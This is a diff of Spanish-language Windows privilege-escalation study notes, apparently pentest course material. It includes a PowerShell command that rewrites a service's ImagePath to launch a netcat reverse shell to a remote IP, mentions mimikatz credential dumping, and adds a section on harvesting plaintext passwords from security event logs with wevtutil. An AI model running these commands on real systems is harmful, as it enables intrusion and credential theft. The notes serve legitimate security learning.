@@ -1902,10 +1902,10 @@ RW HKLM\System\CurrentControlSet\services\regsvc
 ```
 ###### Cambiar ImagePath con PowerShell
 
-Podemos abusar de esto usando el cmdlet de PowerShell. `Set-ItemProperty` para cambiar el `ImagePath` valor, usando un comando como:
+Podemos abusar de esto usando el cmdlet de PowerShell. `Set-ItemProperty` para cambiar el valor de `ImagePath`, usando un comando como:
 
 ```powershell-session
-PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\regsvc -Name "ImagePath" -Value "C:\Temp\nc.exe -e cmd.exe 192.168.56.5 4444"
+Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\regsvc -Name "ImagePath" -Value "C:\Temp\nc.exe -e cmd.exe 192.168.56.5 4444"
 ```
 
 ```powershell
@@ -1930,10 +1930,6 @@ Similar al ataque de permisos en los servicios, podemos comprobar los permisos d
 
 ```powershell
 accesschk.exe /accepteula -uwcqv <SERVICE>
-```
-
-```powershell
-accesschk64.exe /accepteula -wuvc <SERVICE>
 ```
 
 Si tenemos el permiso `SERVICE_CHANGE_CONFIG` podemos manipular un servicio.
@@ -2002,6 +1998,57 @@ Explicación:
 - `sekurlsa::logonpasswords` Extrae credenciales del volcado.
 
 ##### Event Log Readers
+El grupo **Event Log Readers** en Windows está disenñado para permitir que sus miembros lean los registros de eventos del sistema. Este grupo suele incluir a usuarios que necesitan monitorear o analizar eventos del sistema y aplicaciones sin otorgarles privilegios administrativos más amplios.
+
+Privilegios Concedidos.
+
+Los miembros del grupo **Event Logs Readers** tiene los siguientes privilegios:
+
+1. **Leer Registros de Eventos**: Los usuarios pueden acceder y leer los registros de eventos generados por el sistema operativo Windows, aplicaciones y servicios.
+2. **Ver Registros de Seguridad**: Estoy incluye acceso a eventos relacionados con la seguridad, que pueden contener información sensible como inicios de sesión de usuarios, cambios en cuentas y modificaciones en políticas de seguridad.
+
+Riesgos de Escalación de Privilegios:
+
+Aunque el grupo no otorga privilegios elevados de manera inherente, existen escenarios específicos en los que sus miembros podrían escalar sus privilegios:
+
+1. **Análisis de Registros de Seguridad**:
+    - Al revisar los registros de seguridad, un usuario podría indentificar información sensible, como credenciales de cuentas, bloqueos de cuentas o cambios reaizados por otros usuarios. Esta información podría ser utilizada para obtener acceso no autorizado a cuentas o sistemas.
+2. **Identificación de Vulnerabilidades**:
+    - Los usuarios pueden analizar los registros de events, para detectar configuraciones incorrectas o vulnerabilidades en el sistema. Por ejemplo, si un administrador inicia y cierra sesión con frecuencia o si hay múltiples intentos fallidos, esto podría indicar contraseñas débiles o cuentas mal protegidas.
+3. **Enfoque en Otros Usuarios**:
+    - La información de los registros de eventos puede ayudar a identificar cuentas con altos privilegios y sus patrones de actividad. Un atacante podría utilizar esta información para realizar ataques dirigidos, como phising o ingeniería social, contra esos usuarios.
+4. **Explotación del Acceso a Registros para Otros Ataques**:
+    - Si un usuario puede leer los registros de eventos, podría manipular servicios de registros u otros componentes para realizar acciones con mayores privilegios, especialemente si existen vulnerabilidades o configuraciones incorretas en esos servicios.
+
+###### Búsqueda de registros de seguridad con wevtutil 
+
+La utilidad `wevtutil` es una herramienta eficaz para administrar los registros de eventos de Windows. Permite consultarlos y recuperar información según criterios específicos. En este ejemplo, nos centraremos en consultar el registro de seguridad para encontrar eventos específicos relacionados con el usuario.
+
+```powershell
+wevtutil qe Security /rd:true /f:text | Select-String "/user"
+```
+
+Explicación:
+
+- `wevtutil`: Esta es la utilidad de línea de comandos para la administración de eventos de Windows.
+- `qe Security`: Esta opción específica que queremos consultar el registro de seguridad.
+- `/rd:true`: Esta opción invierte el orden de eventos, mostrando primero los más recientes. Esto resulta útil para identificar rápidamente las actividades más recientes.
+- `/f:text`: Esta opción específica el formato de la salida. En este caso, solicitamos la salida en texto plano.
+- `| Select-String "/user"`: Esta parte del comando envía la salida al cmdlet `Select-String`, que filtra los ressultados para incluir solo líneas que contiene la cadena `/user`. Esto es particularmente útil para identificar entradas de registro relacionadas con las acciones de la cuenta de registro.
+
+###### Salida de muestra
+
+El comando puede producir un resultado similar al siguiente:
+
+```powershell
+Process Command Line: net use T: \\dbs\backups /user:elliot Password123!
+```
+
+Interpretación de la salida
+
+- La salida indica que se ejecutó un comando para establecer una conexión de red a `\\dbs\backups` utilizando el nombre de usuario (`elliot`) y la contraseña especificados (`Password123!`).
+- Esta información puede ser crucial para el análisis de seguridad, ya que revela la actividad del usuario relacionada con los recursos compartidos de la red, lo que potencialmente podría indicar acceso no autorizado o uso indebido de credenciales.
+
 ##### Print Operators
 ##### SeTakeOwnershipPrivilege
 
